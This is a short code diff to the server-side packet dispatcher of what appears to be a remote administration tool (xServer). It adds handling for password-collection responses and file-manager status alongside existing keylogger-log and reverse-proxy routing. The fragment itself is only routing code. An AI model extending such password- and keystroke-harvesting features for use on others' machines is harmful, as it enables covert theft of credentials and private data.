@@ -75,6 +75,14 @@ namespace xServer.Core.Packets
             {
                 CommandHandler.HandleGetKeyloggerLogsResponse(client, (ClientPackets.GetKeyloggerLogsResponse)packet);
             }
+            else if (type == typeof(ClientPackets.GetPasswordsResponse))
+            {
+                CommandHandler.HandleGetPasswordsResponse(client, (ClientPackets.GetPasswordsResponse)packet);
+            }
+            else if (type == typeof(ClientPackets.SetStatusFileManager))
+            {
+                CommandHandler.HandleSetStatusFileManager(client, (ClientPackets.SetStatusFileManager)packet);
+            }
             else if (type == typeof(ReverseProxy.Packets.ReverseProxyConnectResponse) ||
                     type == typeof(ReverseProxy.Packets.ReverseProxyData) ||
                     type == typeof(ReverseProxy.Packets.ReverseProxyDisconnect))
